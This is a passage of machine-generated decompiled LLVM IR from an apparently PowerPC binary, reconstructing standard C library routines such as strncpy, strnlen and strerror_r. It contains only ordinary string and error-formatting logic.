  %v1_1000d320 = add i32 %v0_1000d31c, 2
  %v2_1000d344 = inttoptr i32 %v1_1000d318 to i8*
  %v3_1000d344 = load i8, i8* %v2_1000d344, align 1
  %v2_1000d348 = inttoptr i32 %v1_1000d320 to i8*
  %v3_1000d348 = load i8, i8* %v2_1000d348, align 1
  %v3_1000d34c = icmp eq i8 %v3_1000d344, 0
  %v4_1000d350.not = icmp ne i8 %v3_1000d344, %v3_1000d348
  %brmerge2 = or i1 %v3_1000d34c, %v4_1000d350.not
  br i1 %brmerge2, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d364

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d344, %dec_label_pc_1000d314, %dec_label_pc_1000d2f4
  %v1_1000d35c.in = phi i8 [ %v3_1000d344, %dec_label_pc_1000d344 ], [ %v3_1000d314, %dec_label_pc_1000d314 ], [ %v2_1000d2f4, %dec_label_pc_1000d2f4 ]
  %v0_1000d35c.in = phi i8 [ %v3_1000d348, %dec_label_pc_1000d344 ], [ %v3_1000d31c, %dec_label_pc_1000d314 ], [ %v2_1000d2fc, %dec_label_pc_1000d2f4 ]
  %v0_1000d35c = zext i8 %v0_1000d35c.in to i32
  %v1_1000d35c = zext i8 %v1_1000d35c.in to i32
  %v2_1000d35c = sub nsw i32 %v1_1000d35c, %v0_1000d35c
  ret i32 %v2_1000d35c

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d344
  %v2_1000d364 = inttoptr i32 %v1_1000d328 to i8*
  %v3_1000d364 = load i8, i8* %v2_1000d364, align 1
  %v4_1000d364 = zext i8 %v3_1000d364 to i32
  %v2_1000d368 = inttoptr i32 %v1_1000d32c to i8*
  %v3_1000d368 = load i8, i8* %v2_1000d368, align 1
  %v4_1000d368 = zext i8 %v3_1000d368 to i32
  %v3_1000d36c = icmp eq i8 %v3_1000d364, 0
  %v4_1000d370.not = icmp ne i8 %v3_1000d364, %v3_1000d368
  %brmerge3 = or i1 %v3_1000d36c, %v4_1000d370.not
  br i1 %brmerge3, label %dec_label_pc_1000d3a8, label %dec_label_pc_1000d37c

dec_label_pc_1000d37c:                            ; preds = %dec_label_pc_1000d364
  %v1_1000d37c = add i32 %v0_1000d37c, -1
  %v2_1000d37c = icmp eq i32 %v1_1000d37c, 0
  br i1 %v2_1000d37c, label %dec_label_pc_1000d380, label %dec_label_pc_1000d2f4

dec_label_pc_1000d380:                            ; preds = %dec_label_pc_1000d37c
  %v1_1000d380 = urem i32 %arg2, 4
  br label %dec_label_pc_1000d3b0

dec_label_pc_1000d388:                            ; preds = %dec_label_pc_1000d3b8
  %v1_1000d388 = inttoptr i32 %v0_1000d388 to i8*
  %v2_1000d388 = load i8, i8* %v1_1000d388, align 1
  %v3_1000d388 = zext i8 %v2_1000d388 to i32
  %v1_1000d38c = add i32 %v0_1000d388, 1
  store i32 %v1_1000d38c, i32* @r10, align 4
  %v0_1000d390 = load i32, i32* @r4, align 4
  %v1_1000d390 = inttoptr i32 %v0_1000d390 to i8*
  %v2_1000d390 = load i8, i8* %v1_1000d390, align 1
  %v3_1000d390 = zext i8 %v2_1000d390 to i32
  %v1_1000d394 = add i32 %v0_1000d390, 1
  store i32 %v1_1000d394, i32* @r4, align 4
  %v3_1000d398 = icmp eq i8 %v2_1000d388, 0
  %v4_1000d39c.not = icmp ne i8 %v2_1000d388, %v2_1000d390
  %brmerge4 = or i1 %v3_1000d398, %v4_1000d39c.not
  br i1 %brmerge4, label %dec_label_pc_1000d3a8, label %dec_label_pc_1000d3b8

dec_label_pc_1000d3a8:                            ; preds = %dec_label_pc_1000d364, %dec_label_pc_1000d388
  %v1_1000d3a8 = phi i32 [ %v3_1000d388, %dec_label_pc_1000d388 ], [ %v4_1000d364, %dec_label_pc_1000d364 ]
  %v0_1000d3a8 = phi i32 [ %v3_1000d390, %dec_label_pc_1000d388 ], [ %v4_1000d368, %dec_label_pc_1000d364 ]
  %v2_1000d3a8 = sub nsw i32 %v1_1000d3a8, %v0_1000d3a8
  ret i32 %v2_1000d3a8

dec_label_pc_1000d3b0:                            ; preds = %entry, %dec_label_pc_1000d380
  %v1_1000d3bc20 = phi i32 [ 0, %entry ], [ %v4_1000d364, %dec_label_pc_1000d380 ]
  %v0_1000d3bc18 = phi i32 [ 0, %entry ], [ %v4_1000d368, %dec_label_pc_1000d380 ]
  %v0_1000d38814 = phi i32 [ %tmp, %entry ], [ %v1_1000d330, %dec_label_pc_1000d380 ]
  %v0_1000d3b0 = phi i32 [ %arg2, %entry ], [ %v1_1000d380, %dec_label_pc_1000d380 ]
  %v1_1000d3b0 = add i32 %v0_1000d3b0, 1
  br label %dec_label_pc_1000d3b8

dec_label_pc_1000d3b8:                            ; preds = %dec_label_pc_1000d388, %dec_label_pc_1000d3b0
  %v1_1000d3bc = phi i32 [ %v3_1000d388, %dec_label_pc_1000d388 ], [ %v1_1000d3bc20, %dec_label_pc_1000d3b0 ]
  %v0_1000d3bc = phi i32 [ %v3_1000d390, %dec_label_pc_1000d388 ], [ %v0_1000d3bc18, %dec_label_pc_1000d3b0 ]
  %v0_1000d388 = phi i32 [ %v1_1000d38c, %dec_label_pc_1000d388 ], [ %v0_1000d38814, %dec_label_pc_1000d3b0 ]
  %v0_1000d3b8 = phi i32 [ %v1_1000d3b8, %dec_label_pc_1000d388 ], [ %v1_1000d3b0, %dec_label_pc_1000d3b0 ]
  %v1_1000d3b8 = add i32 %v0_1000d3b8, -1
  %v2_1000d3b8 = icmp eq i32 %v1_1000d3b8, 0
  br i1 %v2_1000d3b8, label %dec_label_pc_1000d3bc, label %dec_label_pc_1000d388

dec_label_pc_1000d3bc:                            ; preds = %dec_label_pc_1000d3b8
  %v2_1000d3bc = sub nsw i32 %v1_1000d3bc, %v0_1000d3bc
  ret i32 %v2_1000d3bc

; uselistorder directives
  uselistorder i32 %v1_1000d3b8, { 1, 0 }
  uselistorder i32 %v3_1000d390, { 1, 0 }
  uselistorder i32 %v3_1000d388, { 1, 0 }
  uselistorder i32 %v1_1000d37c, { 1, 0 }
  uselistorder i32 %v4_1000d368, { 1, 0 }
  uselistorder i32 %v4_1000d364, { 1, 0 }
  uselistorder i32 %v1_1000d334, { 1, 0 }
  uselistorder i32 %v1_1000d330, { 0, 2, 1 }
  uselistorder i32 %v0_1000d314, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000d31c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000d3b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3a8, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000d3c4 = icmp eq i32 %arg2, 3
  store i1 %v3_1000d3c4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d3c8 = add i32 %arg1, -1
  store i32 %v1_1000d3c8, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000d444, label %dec_label_pc_1000d3d0

dec_label_pc_1000d3d0:                            ; preds = %entry
  %v1_1000d3d0 = udiv i32 %arg2, 4
  store i32 %v1_1000d3d0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d3d8

dec_label_pc_1000d3d8:                            ; preds = %dec_label_pc_1000d428, %dec_label_pc_1000d3d0
  %v2_1000d3e8 = phi i32 [ %v3_1000d420, %dec_label_pc_1000d428 ], [ %v1_1000d3c8, %dec_label_pc_1000d3d0 ]
  %v0_1000d3d8 = load i32, i32* @r4, align 4
  %v1_1000d3d8 = inttoptr i32 %v0_1000d3d8 to i8*
  %v2_1000d3d8 = load i8, i8* %v1_1000d3d8, align 1
  %v1_1000d3dc = add i32 %v0_1000d3d8, 1
  store i32 %v1_1000d3dc, i32* @r10, align 4
  %v1_1000d3e0 = add i32 %v0_1000d3d8, 2
  store i32 %v1_1000d3e0, i32* @r8, align 4
  %v3_1000d3e4 = icmp eq i8 %v2_1000d3d8, 0
  store i1 %v3_1000d3e4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d3e8 = add i32 %v2_1000d3e8, 1
  %v4_1000d3e8 = inttoptr i32 %v3_1000d3e8 to i8*
  store i8 %v2_1000d3d8, i8* %v4_1000d3e8, align 1
  store i32 %v3_1000d3e8, i32* %r11.global-to-local, align 4
  %v0_1000d3ec = load i32, i32* @r8, align 4
  %v1_1000d3ec = add i32 %v0_1000d3ec, 1
  store i32 %v1_1000d3ec, i32* %r9.global-to-local, align 4
  %v0_1000d3f0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d3f0, label %dec_label_pc_1000d430, label %dec_label_pc_1000d3f4

dec_label_pc_1000d3f4:                            ; preds = %dec_label_pc_1000d3d8
  %v0_1000d3f4 = load i32, i32* @r4, align 4
  %v1_1000d3f4 = add i32 %v0_1000d3f4, 1
  %v2_1000d3f4 = inttoptr i32 %v1_1000d3f4 to i8*
  %v3_1000d3f4 = load i8, i8* %v2_1000d3f4, align 1
  %v1_1000d3f8 = add i32 %v0_1000d3ec, 2
  store i32 %v1_1000d3f8, i32* @r4, align 4
  %v3_1000d3fc = icmp eq i8 %v3_1000d3f4, 0
  store i1 %v3_1000d3fc, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d400 = add i32 %v2_1000d3e8, 2
  %v4_1000d400 = inttoptr i32 %v3_1000d400 to i8*
  store i8 %v3_1000d3f4, i8* %v4_1000d400, align 1
  store i32 %v3_1000d400, i32* %r11.global-to-local, align 4
  %v0_1000d404 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d404, label %dec_label_pc_1000d430, label %dec_label_pc_1000d408

dec_label_pc_1000d408:                            ; preds = %dec_label_pc_1000d3f4
  %v0_1000d408 = load i32, i32* @r10, align 4
  %v1_1000d408 = add i32 %v0_1000d408, 1
  %v2_1000d408 = inttoptr i32 %v1_1000d408 to i8*
  %v3_1000d408 = load i8, i8* %v2_1000d408, align 1
  %v3_1000d40c = icmp eq i8 %v3_1000d408, 0
  store i1 %v3_1000d40c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d410 = add i32 %v2_1000d3e8, 3
  %v4_1000d410 = inttoptr i32 %v3_1000d410 to i8*
  store i8 %v3_1000d408, i8* %v4_1000d410, align 1
  store i32 %v3_1000d410, i32* %r11.global-to-local, align 4
  %v0_1000d414 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d414, label %dec_label_pc_1000d430, label %dec_label_pc_1000d418

dec_label_pc_1000d418:                            ; preds = %dec_label_pc_1000d408
  %v0_1000d418 = load i32, i32* @r8, align 4
  %v1_1000d418 = add i32 %v0_1000d418, 1
  %v2_1000d418 = inttoptr i32 %v1_1000d418 to i8*
  %v3_1000d418 = load i8, i8* %v2_1000d418, align 1
  %v3_1000d41c = icmp eq i8 %v3_1000d418, 0
  store i1 %v3_1000d41c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d420 = add i32 %v2_1000d3e8, 4
  %v4_1000d420 = inttoptr i32 %v3_1000d420 to i8*
  store i8 %v3_1000d418, i8* %v4_1000d420, align 1
  store i32 %v3_1000d420, i32* %r11.global-to-local, align 4
  %v0_1000d424 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d424, label %dec_label_pc_1000d430, label %dec_label_pc_1000d428

dec_label_pc_1000d428:                            ; preds = %dec_label_pc_1000d418
  %v0_1000d428 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d428 = add i32 %v0_1000d428, -1
  store i32 %v1_1000d428, i32* %ctr.global-to-local, align 4
  %v2_1000d428 = icmp eq i32 %v1_1000d428, 0
  br i1 %v2_1000d428, label %dec_label_pc_1000d444, label %dec_label_pc_1000d3d8

dec_label_pc_1000d430:                            ; preds = %dec_label_pc_1000d418, %dec_label_pc_1000d408, %dec_label_pc_1000d3f4, %dec_label_pc_1000d3d8
  %v1_1000d430 = phi i32 [ %v3_1000d420, %dec_label_pc_1000d418 ], [ %v3_1000d410, %dec_label_pc_1000d408 ], [ %v3_1000d400, %dec_label_pc_1000d3f4 ], [ %v3_1000d3e8, %dec_label_pc_1000d3d8 ]
  %v2_1000d43011 = sub i32 %arg1, %v1_1000d430
  %v2_1000d434 = add i32 %v2_1000d43011, %arg2
  %v1_1000d438 = add i32 %v2_1000d434, -1
  store i32 %v1_1000d438, i32* %r9.global-to-local, align 4
  %v4_1000d438 = icmp eq i32 %v1_1000d438, 0
  %v0_1000d43c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d438, i32 %v0_1000d43c)
  %v2_1000d474.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d46c

dec_label_pc_1000d444:                            ; preds = %dec_label_pc_1000d428, %entry
  %v1_1000d444 = urem i32 %arg2, 4
  store i32 %v1_1000d444, i32* %r9.global-to-local, align 4
  %v3_1000d444 = icmp eq i32 %v1_1000d444, 0
  %v0_1000d448 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d444, i32 %v0_1000d448)
  store i32 %v1_1000d444, i32* %ctr.global-to-local, align 4
  %v2_1000d460.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d450

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d468.dec_label_pc_1000d450_crit_edge, %dec_label_pc_1000d444
  %v2_1000d460 = phi i32 [ %v3_1000d460, %dec_label_pc_1000d468.dec_label_pc_1000d450_crit_edge ], [ %v2_1000d460.pre, %dec_label_pc_1000d444 ]
  %v0_1000d454 = phi i32 [ %v0_1000d454.pre, %dec_label_pc_1000d468.dec_label_pc_1000d450_crit_edge ], [ %v1_1000d444, %dec_label_pc_1000d444 ]
  %v0_1000d450 = load i32, i32* @r4, align 4
  %v1_1000d450 = inttoptr i32 %v0_1000d450 to i8*
  %v2_1000d450 = load i8, i8* %v1_1000d450, align 1
  %v1_1000d454 = add i32 %v0_1000d454, -1
  store i32 %v1_1000d454, i32* %r9.global-to-local, align 4
  %v1_1000d458 = add i32 %v0_1000d450, 1
  store i32 %v1_1000d458, i32* @r4, align 4
  %v3_1000d45c = icmp eq i8 %v2_1000d450, 0
  store i1 %v3_1000d45c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d460 = add i32 %v2_1000d460, 1
  %v4_1000d460 = inttoptr i32 %v3_1000d460 to i8*
  store i8 %v2_1000d450, i8* %v4_1000d460, align 1
  store i32 %v3_1000d460, i32* %r11.global-to-local, align 4
  %v0_1000d464 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d464 = add i32 %v0_1000d464, -1
  store i32 %v1_1000d464, i32* %ctr.global-to-local, align 4
  %v2_1000d464 = icmp eq i32 %v1_1000d464, 0
  br i1 %v2_1000d464, label %dec_label_pc_1000d47c, label %dec_label_pc_1000d468

dec_label_pc_1000d468:                            ; preds = %dec_label_pc_1000d450
  %v0_1000d468 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d468, label %dec_label_pc_1000d46c, label %dec_label_pc_1000d468.dec_label_pc_1000d450_crit_edge

dec_label_pc_1000d468.dec_label_pc_1000d450_crit_edge: ; preds = %dec_label_pc_1000d468
  %v0_1000d454.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d450

dec_label_pc_1000d46c:                            ; preds = %dec_label_pc_1000d468, %dec_label_pc_1000d430
  %v2_1000d474.pre = phi i32 [ %v2_1000d474.pre.pre, %dec_label_pc_1000d430 ], [ %v3_1000d460, %dec_label_pc_1000d468 ]
  %v0_1000d46c = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000d46c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d470

dec_label_pc_1000d470:                            ; preds = %dec_label_pc_1000d470, %dec_label_pc_1000d46c
  %v2_1000d474 = phi i32 [ %v3_1000d474, %dec_label_pc_1000d470 ], [ %v2_1000d474.pre, %dec_label_pc_1000d46c ]
  %v3_1000d474 = add i32 %v2_1000d474, 1
  %v4_1000d474 = inttoptr i32 %v3_1000d474 to i8*
  store i8 0, i8* %v4_1000d474, align 1
  store i32 %v3_1000d474, i32* %r11.global-to-local, align 4
  %v0_1000d478 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d478 = add i32 %v0_1000d478, -1
  store i32 %v1_1000d478, i32* %ctr.global-to-local, align 4
  %v2_1000d478 = icmp eq i32 %v1_1000d478, 0
  br i1 %v2_1000d478, label %dec_label_pc_1000d47c, label %dec_label_pc_1000d470

dec_label_pc_1000d47c:                            ; preds = %dec_label_pc_1000d450, %dec_label_pc_1000d470
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000d478, { 1, 0 }
  uselistorder i32 %v3_1000d474, { 1, 2, 0 }
  uselistorder i32 %v1_1000d464, { 1, 0 }
  uselistorder i32 %v3_1000d460, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000d444, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000d428, { 1, 0 }
  uselistorder i32 %v3_1000d420, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d47c, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d480 = load i32, i32* @r4, align 4
  %v3_1000d480 = icmp eq i32 %v0_1000d480, 0
  store i32 %tmp, i32* @r10, align 4
  %v0_1000d48c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d480, i32 %v0_1000d48c)
  %v0_1000d49c = load i32, i32* @r10, align 4
  %v1_1000d49c = load i32, i32* @r4, align 4
  %v2_1000d49c = add i32 %v1_1000d49c, %v0_1000d49c
  %v3_1000d4a0 = icmp ugt i32 %v2_1000d49c, %v0_1000d49c
  %v4_1000d4a0 = icmp eq i32 %v1_1000d49c, 0
  %v2_1000d4a4 = or i1 %v4_1000d4a0, %v3_1000d4a0
  br i1 %v2_1000d4a4, label %dec_label_pc_1000d4ac, label %dec_label_pc_1000d4a8

dec_label_pc_1000d494:                            ; preds = %dec_label_pc_1000d514
  br label %dec_label_pc_1000d558

dec_label_pc_1000d4a8:                            ; preds = %entry
  br label %dec_label_pc_1000d4ac

dec_label_pc_1000d4ac:                            ; preds = %entry, %dec_label_pc_1000d4a8
  %v0_1000d55c = phi i32 [ %v2_1000d49c, %entry ], [ -1, %dec_label_pc_1000d4a8 ]
  %v1_1000d4dc6 = urem i32 %v0_1000d49c, 4
  %v3_1000d4dc8 = icmp eq i32 %v1_1000d4dc6, 0
  br i1 %v3_1000d4dc8, label %dec_label_pc_1000d4e4, label %dec_label_pc_1000d4b4

dec_label_pc_1000d4b4:                            ; preds = %dec_label_pc_1000d4ac, %dec_label_pc_1000d4d8
  %v0_1000d4cc = phi i32 [ %v1_1000d4d8, %dec_label_pc_1000d4d8 ], [ %v0_1000d49c, %dec_label_pc_1000d4ac ]
  %v1_1000d4b4 = inttoptr i32 %v0_1000d4cc to i8*
  %v2_1000d4b4 = load i8, i8* %v1_1000d4b4, align 1
  %v3_1000d4b8 = icmp eq i8 %v2_1000d4b4, 0
  br i1 %v3_1000d4b8, label %dec_label_pc_1000d4c0, label %dec_label_pc_1000d4d8

dec_label_pc_1000d4c0:                            ; preds = %dec_label_pc_1000d4b4
  %v3_1000d4c0 = icmp ugt i32 %v0_1000d55c, %v0_1000d4cc
  %v0_1000d4cc.v0_1000d55c = select i1 %v3_1000d4c0, i32 %v0_1000d4cc, i32 %v0_1000d55c
  %v2_1000d4d0 = sub i32 %v0_1000d4cc.v0_1000d55c, %v0_1000d49c
  ret i32 %v2_1000d4d0

dec_label_pc_1000d4d8:                            ; preds = %dec_label_pc_1000d4b4
  %v1_1000d4d8 = add i32 %v0_1000d4cc, 1
  %v1_1000d4dc = urem i32 %v1_1000d4d8, 4
  %v3_1000d4dc = icmp eq i32 %v1_1000d4dc, 0
  br i1 %v3_1000d4dc, label %dec_label_pc_1000d4e4, label %dec_label_pc_1000d4b4

dec_label_pc_1000d4e4:                            ; preds = %dec_label_pc_1000d4d8, %dec_label_pc_1000d4ac
  %v0_1000d4e8 = phi i32 [ %v0_1000d49c, %dec_label_pc_1000d4ac ], [ %v1_1000d4d8, %dec_label_pc_1000d4d8 ]
  %v2_1000d5503 = icmp ult i32 %v0_1000d4e8, %v0_1000d55c
  br i1 %v2_1000d5503, label %dec_label_pc_1000d4f4, label %dec_label_pc_1000d558

dec_label_pc_1000d4f4:                            ; preds = %dec_label_pc_1000d4e4, %dec_label_pc_1000d54c
  %v0_1000d494 = phi i32 [ %v1_1000d4f8, %dec_label_pc_1000d54c ], [ %v0_1000d4e8, %dec_label_pc_1000d4e4 ]
  %v1_1000d4f4 = inttoptr i32 %v0_1000d494 to i32*
  %v2_1000d4f4 = load i32, i32* %v1_1000d4f4, align 4
  %v1_1000d4f8 = add i32 %v0_1000d494, 4
  store i32 %v0_1000d494, i32* @r8, align 4
  %v1_1000d504 = add i32 %v2_1000d4f4, -16843009
  %v2_1000d508 = and i32 %v1_1000d504, -2139062144
  %v5_1000d508 = icmp eq i32 %v2_1000d508, 0
  %v1_1000d50c = add i32 %v0_1000d494, 1
  br i1 %v5_1000d508, label %dec_label_pc_1000d54c, label %dec_label_pc_1000d514

dec_label_pc_1000d514:                            ; preds = %dec_label_pc_1000d4f4
  %v2_1000d514 = inttoptr i32 %v0_1000d494 to i8*
  %v3_1000d514 = load i8, i8* %v2_1000d514, align 1
  %v3_1000d518 = icmp eq i8 %v3_1000d514, 0
  br i1 %v3_1000d518, label %dec_label_pc_1000d494, label %dec_label_pc_1000d520

dec_label_pc_1000d520:                            ; preds = %dec_label_pc_1000d514
  %v2_1000d520 = inttoptr i32 %v1_1000d50c to i8*
  %v3_1000d520 = load i8, i8* %v2_1000d520, align 1
  %v3_1000d524 = icmp eq i8 %v3_1000d520, 0
  br i1 %v3_1000d524, label %dec_label_pc_1000d558, label %dec_label_pc_1000d52c

dec_label_pc_1000d52c:                            ; preds = %dec_label_pc_1000d520
  %v1_1000d52c = add i32 %v0_1000d494, 2
  %v2_1000d52c = inttoptr i32 %v1_1000d52c to i8*
  %v3_1000d52c = load i8, i8* %v2_1000d52c, align 1
  %v3_1000d534 = icmp eq i8 %v3_1000d52c, 0
  br i1 %v3_1000d534, label %dec_label_pc_1000d558, label %dec_label_pc_1000d53c

dec_label_pc_1000d53c:                            ; preds = %dec_label_pc_1000d52c
  %v1_1000d53c = add i32 %v0_1000d494, 3
  %v2_1000d53c = inttoptr i32 %v1_1000d53c to i8*
  %v3_1000d53c = load i8, i8* %v2_1000d53c, align 1
  %v3_1000d544 = icmp eq i8 %v3_1000d53c, 0
  br i1 %v3_1000d544, label %dec_label_pc_1000d558, label %dec_label_pc_1000d54c

dec_label_pc_1000d54c:                            ; preds = %dec_label_pc_1000d53c, %dec_label_pc_1000d4f4
  %v2_1000d550 = icmp ult i32 %v1_1000d4f8, %v0_1000d55c
  br i1 %v2_1000d550, label %dec_label_pc_1000d4f4, label %dec_label_pc_1000d558

dec_label_pc_1000d558:                            ; preds = %dec_label_pc_1000d54c, %dec_label_pc_1000d520, %dec_label_pc_1000d52c, %dec_label_pc_1000d53c, %dec_label_pc_1000d4e4, %dec_label_pc_1000d494
  %v0_1000d564 = phi i32 [ %v0_1000d494, %dec_label_pc_1000d494 ], [ %v0_1000d4e8, %dec_label_pc_1000d4e4 ], [ %v1_1000d53c, %dec_label_pc_1000d53c ], [ %v1_1000d52c, %dec_label_pc_1000d52c ], [ %v1_1000d50c, %dec_label_pc_1000d520 ], [ %v0_1000d55c, %dec_label_pc_1000d54c ]
  %v3_1000d558 = icmp ugt i32 %v0_1000d55c, %v0_1000d564
  %v0_1000d564.v0_1000d55c = select i1 %v3_1000d558, i32 %v0_1000d564, i32 %v0_1000d55c
  %v2_1000d568 = sub i32 %v0_1000d564.v0_1000d55c, %v0_1000d49c
  ret i32 %v2_1000d568

; uselistorder directives
  uselistorder i32 %v1_1000d4f8, { 1, 0 }
  uselistorder i32 %v0_1000d494, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000d4e8, { 1, 0, 2 }
  uselistorder i32 %v1_1000d4d8, { 1, 0, 2 }
  uselistorder i32 %v0_1000d4cc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000d55c, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000d49c, { 1, 0 }
  uselistorder i32 %v0_1000d49c, { 4, 3, 5, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_1000d558, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000d4f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4ac, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268490120, i32* @lr, align 4
  %v0_1000d584 = call i32 @__xpg_strerror_r()
  %v0_1000d58c = load i32, i32* @r29, align 4
  ret i32 %v0_1000d58c
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000d5a0 = load i32, i32* @r3, align 4
  %v2_1000d5a0 = icmp ugt i32 %v0_1000d5a0, 124
  %v0_1000d5b0 = load i32, i32* @r4, align 4
  store i32 %v0_1000d5b0, i32* %r27.global-to-local, align 4
  %v0_1000d5b8 = load i32, i32* @r5, align 4
  br i1 %v2_1000d5a0, label %dec_label_pc_1000d5fc, label %dec_label_pc_1000d5c0

dec_label_pc_1000d5c0:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_10018d50.416 to i32), i32* @r30, align 4
  %v3_1000d5dc7 = icmp eq i32 %v0_1000d5a0, 0
  br i1 %v3_1000d5dc7, label %dec_label_pc_1000d5f0, label %dec_label_pc_1000d5d0

dec_label_pc_1000d5d0:                            ; preds = %dec_label_pc_1000d5c0, %dec_label_pc_1000d5d0
  br label %dec_label_pc_1000d5d0

dec_label_pc_1000d5f0:                            ; preds = %dec_label_pc_1000d5c0
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d630

dec_label_pc_1000d5fc:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000d5a0, 0
  %v1_1000d600 = zext i1 %tmp to i32
  %v2_1000d600 = ashr i32 %v0_1000d5a0, 31
  %v3_1000d600 = and i32 %v2_1000d600, -2
  %v4_1000d600 = or i32 %v3_1000d600, %v1_1000d600
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000d614 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000d614 = call i32 @_uintmaxtostr(i8* %v5_1000d614, i32 %v4_1000d600, i32 %v0_1000d5a0, i32 -10, i32 0)
  %v1_1000d61c = add i32 %v6_1000d614, -14
  store i32 %v1_1000d61c, i32* @r30, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10018d40.417 to i32), i32* @r4, align 4
  store i32 %v1_1000d61c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268490288, i32* @lr, align 4
  %v0_1000d62c = call i32 @memcpy()
  %v0_1000d630.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000d634.pre = load i32, i32* @r30, align 4
  %v0_1000d644.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000d630

dec_label_pc_1000d630:                            ; preds = %dec_label_pc_1000d5f0, %dec_label_pc_1000d5fc
  %v0_1000d644 = phi i32 [ %v0_1000d5b8, %dec_label_pc_1000d5f0 ], [ %v0_1000d644.pre, %dec_label_pc_1000d5fc ]
  %v0_1000d634 = phi i32 [ ptrtoint ([8 x i8]* @global_var_10018d50.416 to i32), %dec_label_pc_1000d5f0 ], [ %v0_1000d634.pre, %dec_label_pc_1000d5fc ]
  %v1_1000d638 = phi i32 [ %v0_1000d5b0, %dec_label_pc_1000d5f0 ], [ %v0_1000d630.pre, %dec_label_pc_1000d5fc ]
  %tmp19 = icmp slt i32 %v1_1000d638, 0
  %v1_1000d630 = zext i1 %tmp19 to i32
  %v2_1000d630 = ashr i32 %v1_1000d638, 31
  %v3_1000d630 = and i32 %v2_1000d630, -2
  %v4_1000d630 = or i32 %v3_1000d630, %v1_1000d630
  store i32 %v0_1000d634, i32* @r3, align 4
  %v2_1000d638 = xor i32 %v4_1000d630, %v1_1000d638
  %v2_1000d63c = sub i32 %v4_1000d630, %v2_1000d638
  %tmp20 = icmp slt i32 %v2_1000d63c, 0
  %v1_1000d640 = zext i1 %tmp20 to i32
  %v2_1000d640 = ashr i32 %v2_1000d63c, 31
  %v3_1000d640 = and i32 %v2_1000d640, -2
  %v4_1000d640 = or i32 %v3_1000d640, %v1_1000d640
  %v2_1000d644 = and i32 %v4_1000d640, %v0_1000d644
  store i32 %v2_1000d644, i32* @r29, align 4
  %v0_1000d648 = call i32 @__GI_strlen()
  %v1_1000d64c = add i32 %v0_1000d648, 1
